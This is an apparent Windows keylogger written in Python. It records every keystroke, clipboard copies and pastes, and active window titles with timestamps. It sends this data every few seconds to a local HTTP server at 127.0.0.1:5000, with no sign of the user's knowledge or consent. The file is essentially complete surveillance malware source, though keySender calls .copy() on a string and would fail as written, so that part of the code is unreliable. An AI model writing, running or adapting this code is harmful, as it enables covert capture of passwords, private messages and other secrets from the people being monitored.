from pynput import keyboard
import threading
import time
import requests
import pyperclip
import re
import datetime
from win32gui import GetWindowText, GetForegroundWindow

dataVal = []

specialIdentifier = "e236829f840cb1e1bb04a7305d33a95ff342cbe4954166ff23ab2037d2b52216\n"
# The above is just meant to be some unqiue value, I chose the hash of a songs lyrics


def main():
    # Spawning the thread to write to the log file every 5 seconds.
    sendKeyThread = threading.Thread(target=keySender)
    sendClipThread = threading.Thread(target=copyClipSender)
    sendFocusThread = threading.Thread(target=focusCapture)
    sendFocusThread.start()
    sendKeyThread.start()
    sendClipThread.start()
    with keyboard.Listener(on_press=recordPress, on_release=recordRelease) as listener:
        listener.join()


def recordPress(key):
    global dataVal
    if str(key) == r"'\x16'":
        pasteClipSender()
    dataVal.append(f"pressed {key}\n")

def recordRelease(key):
    global dataVal
    dataVal.append(f"released {key}\n")

def keySender():
    while True:
        global dataVal
        if len(dataVal) != 0:
            dataCopy = dataVal.copy()
            dataVal = dataVal[len(dataCopy):]
            filteredData = []
            for line in dataCopy:
                data = line.copy()
                line = line.strip()
                if (line.split()[0] == "pressed" or line.split()[0] == "released") and (line.split()[1][0] == "'") and (len(line.split()[1]) > 3):
                    continue
                else:
                    filteredData.append(data)
            postReq = requests.post("http://127.0.0.1:5000/write", json={"data": filteredData})  
        time.sleep(5)

def pasteClipSender():
    curWindow = f"PASTED_IN {timeStamp()} - {GetWindowText(GetForegroundWindow())}\n"
    pasteValue = pyperclip.paste()
    if not (re.search(r'\S', pasteValue)):
        return
    global specialIdentifier
    data = specialIdentifier + curWindow + pasteValue + "\n"
    requests.post("http://127.0.0.1:5000/writeClip", json={"data": str(data)})  



def copyClipSender():
    prevValue = ""
    while True:
        tmp_value = pyperclip.paste()
        if tmp_value != prevValue and tmp_value != None:
            prevValue = tmp_value
            curWindow = f"COPIED_IN {timeStamp()} - {GetWindowText(GetForegroundWindow())}\n"
            data = specialIdentifier + curWindow + prevValue + "\n"
            postReq = requests.post("http://127.0.0.1:5000/writeClip", json={"data": str(data)})  
        time.sleep(1)

def timeStamp():
    dt = datetime.datetime.now()
    formatted_timestamp = dt.strftime("%Y-%m-%d-%Hh")
    return (formatted_timestamp)

def focusCapture ():
    global dataVal
    dataVal.append(f"{timeStamp()} - {GetWindowText(GetForegroundWindow())}\n")
    curWindow = GetWindowText(GetForegroundWindow())
    while True:
        temp = GetWindowText(GetForegroundWindow())
        if temp != curWindow:
            curWindow = temp
            if temp and temp != "Task Switching":
                dataVal.append(f"{timeStamp()} - {temp}\n")




if __name__=="__main__":
    main()
